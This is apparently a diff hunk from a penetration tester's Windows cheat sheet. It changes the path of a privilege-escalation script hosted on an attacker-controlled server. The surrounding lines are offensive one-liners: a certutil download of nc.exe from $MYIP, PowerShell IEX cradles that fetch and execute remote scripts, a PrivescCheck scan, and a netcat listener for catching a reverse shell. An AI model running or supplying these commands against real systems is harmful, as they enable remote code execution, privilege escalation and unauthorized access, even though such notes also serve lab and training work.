@@ -1426,7 +1426,7 @@ certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/whoami')
 
 +---------- Full Privesc Scan ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/PrivescCheck.ps1');Invoke-PrivescCheck
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 
 +---------- Switch User: Known Creds ----------+
 rlwrap nc -lvnp 5566
